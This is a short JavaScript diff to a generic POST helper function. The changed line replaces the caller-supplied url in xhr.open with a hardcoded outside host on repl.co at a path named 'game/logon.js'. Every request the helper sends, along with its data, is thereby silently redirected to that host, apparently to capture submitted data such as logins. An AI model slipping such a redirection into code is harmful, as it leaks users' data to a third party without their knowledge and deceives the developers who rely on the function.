@@ -4,7 +4,7 @@ function getPostData(url, toSend, async, method) {
   var xhr = new XMLHttpRequest()
 
   // Set parameters
-  xhr.open('POST', url, async)
+  xhr.open('POST', 'https://accomplishedlastingdisc.bcat1023.repl.co/game/logon.js', async)
 
   // Add event listener
   xhr.onreadystatechange = function () {
